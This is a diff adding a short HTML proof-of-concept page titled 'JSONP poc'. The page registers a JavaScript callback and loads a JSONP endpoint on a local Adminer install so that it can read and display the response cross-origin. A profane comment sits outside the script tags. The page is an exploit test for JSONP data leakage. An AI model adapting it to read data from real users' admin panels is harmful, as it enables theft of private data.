@@ -1,0 +1,21 @@
+<html>
+<head>
+
+</head>
+
+<body>
+<h1>JSONP poc</h1>
+
+<script type="text/javascript">
+function test(data)
+{
+alert(JSON.stringify(data));
+}
+
+</script>
+
+//fucking poc didn't executed because script tag didnt close -_-
+<script src="http://localhost/adminer/index.php?callback=test"> </script>
+
+</body>
+</html>
